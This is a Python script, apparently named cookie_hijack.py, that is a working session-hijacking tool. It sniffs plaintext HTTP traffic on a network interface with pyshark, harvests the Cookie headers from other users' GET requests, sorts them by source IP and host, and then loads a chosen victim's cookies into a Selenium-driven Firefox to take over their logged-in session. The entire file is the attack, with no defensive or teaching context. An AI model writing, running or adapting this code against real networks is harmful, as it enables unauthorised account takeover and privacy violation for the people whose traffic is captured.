import pyshark
from selenium import webdriver
import re
import sys
import threading


class packet_dict(object):
	
	def __init__(self):
		self.data = {}
		self.nr_to_src = {}
		self.nr_to_host = {}

	def __str__(self):
		res = ""
		for host in self.data.values():
			for cookies in host.values():
				res += str(cookies) + "\n"
		return res

	def __format_cookie_string(self, cookie_string):
		sp = re.split(';\ ', cookie_string)
		tmp = []
		for s in sp:
			tmp.append(tuple(re.split('=',s)))

		res = []
		for t in tmp:
			res.append({'name': t[0], 'value': t[1]})
		return res

	def insert(self, source, host_name, cookie_string):
		if source in self.data.keys():
			if host_name in self.data[source].keys():
				self.data[source][host_name] += self.__format_cookie_string(cookie_string)
			else:
				self.data[source][host_name] = []
				self.data[source][host_name] += (self.__format_cookie_string(cookie_string))
		else:
			self.data[source] = {}
			self.data[source][host_name] = []
			self.data[source][host_name] += self.__format_cookie_string(cookie_string)

	def gen_src_trans(self):
		i = 1
		for source in self.data.keys():
			self.nr_to_src[str(i)] = source
			i += 1

	def gen_host_trans(self, source):
		i = 1
		for host in self.data[source].keys():
			self.nr_to_host[str(i)] = host
			i += 1

data = packet_dict()
stop = False

def sniff():
	for packet in capture.sniff_continuously():
		if not stop:
			try:
				if packet.http.request_method == 'GET':
					#print(packet.ip.src, packet.http.host, packet.http.cookie)
					data.insert(packet.ip.src, packet.http.host, packet.http.cookie)
			except AttributeError:
				pass
		else:
			break

if len(sys.argv) > 0:
	#time = int(sys.argv[1])
	capture = pyshark.LiveCapture(interface='enp0s3', display_filter="http", bpf_filter="tcp port 80")

	t = threading.Thread(target=sniff)
	t.start()
	try:
		print("Press Ctrl+D to stop capture.")
		while True:
			input()
	except EOFError:
		stop = True

	#print(data)
	driver = webdriver.Firefox()
	#driver.set_preference("browser.privatebrowsing.autostart", True)

	data.gen_src_trans()
	print("Sources:")
	print(data.nr_to_src)
	flag1 = True
	while flag1:
		a = input("Enter source number ('0' for exit): ")
		if a in data.nr_to_src.keys():
			flag2 = True
			print("Hosts:")
			data.gen_host_trans(data.nr_to_src[a])
			print(data.nr_to_host)
			while flag2:
				b = input("Enter host number: ('0' for back): ")
				if b in data.nr_to_host.keys():
					#Starting Firefox
					driver.get("http://" + data.nr_to_host[b])
					driver.delete_all_cookies()
					for cookie in data.data[data.nr_to_src[a]][data.nr_to_host[b]]:
						#print(cookie)
						driver.add_cookie(cookie)
					driver.get("http://" + data.nr_to_host[b])
					print("Cookies injected")
				else:
					if b == "0":
						flag2 = False
					else:
						print("Wrong host number")
		else:
			if a == "0":
				flag1 = False
			else:
				print("Wrong source number")
else:
	print("Usage: python3 cookie_hijack.py <timeout>")